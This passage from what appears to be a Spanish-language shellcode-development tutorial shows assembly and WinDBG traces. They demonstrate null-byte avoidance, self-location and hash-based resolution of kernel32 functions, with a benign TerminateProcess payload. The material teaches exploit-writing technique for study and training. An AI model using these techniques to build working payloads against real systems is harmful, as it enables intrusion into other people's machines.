&lt;p&gt;El snippet de código anterior muestra la función de inicio modificada . Tras liberar espacio en la pila, accedemos directamente a la función &lt;code&gt;find_kernel32&lt;&#x2F;code&gt; sin usar la instrucción &lt;code&gt;call&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;Dado que la instrucción &lt;code&gt;CALL&lt;&#x2F;code&gt; no era obligatoria, su eliminación nos permite evitar los bytes nulos generados por la llamada relativa.&lt;&#x2F;p&gt;
&lt;p&gt;Después de obtener la dirección base de kernel32.dll, llegaremos a las funciones recién agregadas que recopilarán la posición de nuestro shellcode en la memoria.&lt;&#x2F;p&gt;
&lt;p&gt;Comenzamos con &lt;code&gt;find_function_shorten&lt;&#x2F;code&gt;. Esta función contiene una sola instrucción de ensamblaje, que es un pequeño salto a &lt;code&gt;find_function_short&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;Debido a que estas funciones están próximas entre sí, los códigos de operación de la instrucción &lt;code&gt;JMP&lt;&#x2F;code&gt; no contendrán bytes nulos.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; class=&quot;language-python z-code&quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;find_function_shorten:&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; 
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;	&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;jmp find_function_short;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; salto corto
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;find_function_ret: &lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; 
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;	&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;pop esi;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;                      &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; Se saca de la pila la direccion de retorno
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;	&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;mov [ebp+0x04], esi;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;          &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; Guarda la dirección find_function para despues
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;	&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;jmp resolve_symbols_kernel32;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; Salta resolve_symbols_kernel32
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;find_function_short:&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; 
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;	&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;call find_function_ret;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; llamada relativa negativa
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;find_function:&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; 
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;	&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;pushad;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; Guarda todos los registros
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-constant z-language z-python&quot;&gt;...&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;El código del Listado anterior muestra que, tras alcanzar &lt;code&gt;find_function_short&lt;&#x2F;code&gt;, solo hay una instrucción. En esta ocasión, usaremos la instrucción &lt;code&gt;call&lt;&#x2F;code&gt; con &lt;code&gt;find_function_ret&lt;&#x2F;code&gt; como destino.&lt;&#x2F;p&gt;
&lt;p&gt;Dado que esta función se encuentra en una posición superior a la instrucción CALL, los códigos de operación generados contendrán un desplazamiento negativo que debería estar libre de bytes nulos, en lugar de uno positivo.&lt;&#x2F;p&gt;
&lt;p&gt;Tras ejecutar la instrucción CALL, se enviará la dirección de retorno a la pila. Esta apuntará a la primera instrucción de &lt;code&gt;find_function&lt;&#x2F;code&gt; .&lt;&#x2F;p&gt;
&lt;p&gt;Al inspeccionar &lt;code&gt;find_function_ret&lt;&#x2F;code&gt;, observamos que la primera instrucción es un POP, que toma el valor de retorno que introdujimos en la pila y lo coloca en ESI.&lt;&#x2F;p&gt;
&lt;p&gt;Después de la instrucción POP, ESI apuntará a la primera instrucción de find_function, lo que nos permite usar una llamada indirecta para invocarla. Luego, esta dirección se guarda en una desreferencia de EBP en el desplazamiento &lt;code&gt;0x04&lt;&#x2F;code&gt; para su uso posterior.&lt;&#x2F;p&gt;
&lt;p&gt;Finalmente, moveremos la instrucciones para enviar el hash, resolver la función y ejecutarla al final del shellcode.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; class=&quot;language-python z-code&quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;find_function_finished:&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;	&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;popad;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; restaturar los registros
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;	&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;ret;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; Return
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;resolve_symbols_kernel32:&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;	&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;push 0x78b5b983;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; TerminateProcess hash
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;	&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;call dword ptr [ebp+0x04];&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; llamada a find_function
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;	&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;mov [ebp+0x14], eax;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; Guardar la direccion TerminateProcess para despues
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;	
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;exec_shellcode:&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; 
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;	&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;xor ecx, ecx;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; Null ECX
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;	&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;push ecx;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; uExitCode
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;	&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;push 0xffffffff;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; hProcess
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;	&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;call dword ptr [ebp+0x14];&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; llamada a TerminateProcess
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Continuemos en WinDBG, pondremos un punto de interrupción en &lt;code&gt;find_function_shorten&lt;&#x2F;code&gt;, un a vez alcanzado daremos el salto y llegaremos a &lt;code&gt;find_function_short&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;0:004&amp;gt; bp 00e20023
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;0:004&amp;gt; g
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;Breakpoint 0 hit
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;eax=020bffcc ebx=76c00000 ecx=00000000 edx=00e20000 esi=000b88d0 edi=000b22f0
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;eip=00e20023 esp=020bfd64 ebp=020bff74 iopl=0         nv up ei pl zr na pe nc
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;00e20023 eb06            jmp     00e2002b
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;0:004&amp;gt; t
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;eax=020bffcc ebx=76c00000 ecx=00000000 edx=00e20000 esi=000b88d0 edi=000b22f0
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;eip=00e2002b esp=020bfd64 ebp=020bff74 iopl=0         nv up ei pl zr na pe nc
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;00e2002b e8f5ffffff      call    00e20025
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;La instrucción &lt;code&gt;call&lt;&#x2F;code&gt; no contiene ningún byte, confirmemos que la dirección de retorno apunta a &lt;code&gt;find_function&lt;&#x2F;code&gt;:&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;0:004&amp;gt; t
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;eax=020bffcc ebx=76c00000 ecx=00000000 edx=00e20000 esi=000b88d0 edi=000b22f0
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;eip=00e20025 esp=020bfd60 ebp=020bff74 iopl=0         nv up ei pl zr na pe nc
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;00e20025 5e              pop     esi
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;0:004&amp;gt; dd esp l1
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;020bfd60  00e20030
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;0:004&amp;gt; u 00e20030
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;00e20030 60              pushad
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;00e20031 8b433c          mov     eax,dword ptr [ebx+3Ch]
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;00e20034 8b7c0378        mov     edi,dword ptr [ebx+eax+78h]
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;00e20038 01df            add     edi,ebx
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;00e2003a 8b4f18          mov     ecx,dword ptr [edi+18h]
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;00e2003d 8b4720          mov     eax,dword ptr [edi+20h]
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;00e20040 01d8            add     eax,ebx
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;00e20042 8945fc          mov     dword ptr [ebp-4],eax
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Según el snippet anterior, la dirección de retorno se inserta en la pila y apunta a la primera instrucción de &lt;code&gt;find_function&lt;&#x2F;code&gt;. Las dos instrucciones siguientes extraerán la dirección de &lt;code&gt;find_function&lt;&#x2F;code&gt; de ESI y la guardarán en la ubicación de memoria indicada por EBP en el desplazamiento &lt;code&gt;0x04&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;0:004&amp;gt; p
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;eax=020bffcc ebx=76c00000 ecx=00000000 edx=00e20000 esi=00e20030 edi=000b22f0
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;eip=00e20026 esp=020bfd64 ebp=020bff74 iopl=0         nv up ei pl zr na pe nc
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;00e20026 897504          mov     dword ptr [ebp+4],esi ss:0023:020bff78=00000000
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;0:004&amp;gt; u @esi
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;00e20030 60              pushad
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;00e20031 8b433c          mov     eax,dword ptr [ebx+3Ch]
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;00e20034 8b7c0378        mov     edi,dword ptr [ebx+eax+78h]
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;00e20038 01df            add     edi,ebx
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;00e2003a 8b4f18          mov     ecx,dword ptr [edi+18h]
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;00e2003d 8b4720          mov     eax,dword ptr [edi+20h]
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;00e20040 01d8            add     eax,ebx
